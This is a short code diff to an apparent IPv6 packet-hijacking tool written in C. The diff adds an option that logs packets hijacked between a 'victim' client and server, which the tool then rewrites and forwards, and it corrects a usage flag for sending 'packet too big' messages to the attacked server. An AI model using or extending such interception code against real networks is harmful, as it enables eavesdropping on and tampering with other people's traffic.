@@ -19,6 +19,7 @@
 #include <device.h>
 #include <packets.h>
 #include <communication.h>
+#include <log.h>
 
 #define DEBUG 0
 
@@ -110,15 +111,22 @@ void packet_action(char *packet) {
 	if (memcmp(&(eth->h_dest), &(device.hwaddr), ETH_ALEN) == 0) {
 		if (!memcmp(&(ip6->ip6_dst), &(svictim.ipv6), sizeof(struct in6_addr))) {
 			printf("Packet Hijacked from client to server? >:-)\n");
+
 			if (opt_verbose)
 				debug_packet(packet);
+			if (opt_log)
+				log_packet(packet);
+
 			fake_packet(packet, &svictim);
 			send_packet(packet);
 		} else if (!memcmp(&(ip6->ip6_src), &(svictim.ipv6), sizeof(struct in6_addr))) {
 			if (!memcmp(&(ip6->ip6_dst), &(cvictim->ipv6), sizeof(struct in6_addr))) {
 				printf("Packet Hijacked from server to client? >:-)\n");
+
 				if (opt_verbose)
 					debug_packet(packet);
+				if (opt_log)
+					log_packet(packet);
 
 				fake_packet(packet, cvictim);
 				send_packet(packet);
@@ -137,7 +145,7 @@ void usage(const char *name) {
 	printf("Usage: %s -i <interface> -d <victim's address>\n" \
 			"\t-l \tLog hijacked packets\n" \
 			"\t-v \tVerbose\n" \
-			"\t-l \tSend \"packet too big\" to attacked server\n", name);
+			"\t-b \tSend \"packet too big\" to attacked server\n", name);
 }
 
 int main(int argc, char **argv) {
